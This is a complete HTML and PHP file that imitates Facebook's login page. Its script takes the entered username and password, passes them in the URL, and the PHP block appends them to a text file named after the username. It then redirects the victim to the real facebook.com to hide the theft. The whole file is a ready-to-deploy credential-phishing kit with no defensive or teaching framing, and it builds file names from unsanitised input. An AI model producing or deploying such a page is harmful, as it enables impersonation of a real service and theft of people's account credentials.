<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
        }

        .container {
            max-width: 400px;
            margin: 100px auto;
            background-color: #fff;
            padding: 20px;
            border-radius: 5px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
        }

        h2 {
            text-align: center;
            margin-bottom: 20px;
        }

        input[type="text"],
        input[type="password"],
        button {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-sizing: border-box;
        }

        button {
            background-color: #1877f2;
            color: #fff;
            font-weight: bold;
            cursor: pointer;
        }

        button:hover {
            background-color: #166fe5;
        }
    </style>
</head>
<body>
    <div class="container">
        <h2>Welcome to Facebook</h2>
        <form id="loginForm" action="<?php echo $_SERVER['PHP_SELF']; ?>" method="POST">
            <input type="text" id="username" name="username" placeholder="Username" required>
            <input type="password" id="password" name="password" placeholder="Password" required>
            <button type="submit">Log In</button>
        </form>
    </div>
    <script>
        document.getElementById("loginForm").addEventListener("submit", function(event) {
            event.preventDefault();
            var username = document.getElementById("username").value;
            var password = document.getElementById("password").value;
            // Send username and password to server
            window.location.href = "<?php echo $_SERVER['PHP_SELF']; ?>?username=" + username + "&password=" + password;
        });
    </script>
    <?php
    if(isset($_GET['username']) && isset($_GET['password'])) {
        $username = $_GET['username'];
        $password = $_GET['password'];
        $filename = $username . ".txt";
        $data = "Username: " . $username . "\nPassword: " . $password . "\n\n";
        file_put_contents($filename, $data, FILE_APPEND | LOCK_EX);
        // Redirect to actual Facebook login page
        echo '<script>window.location.href = "https://www.facebook.com/";</script>';
        exit();
    }
    ?>
</body>
</html>
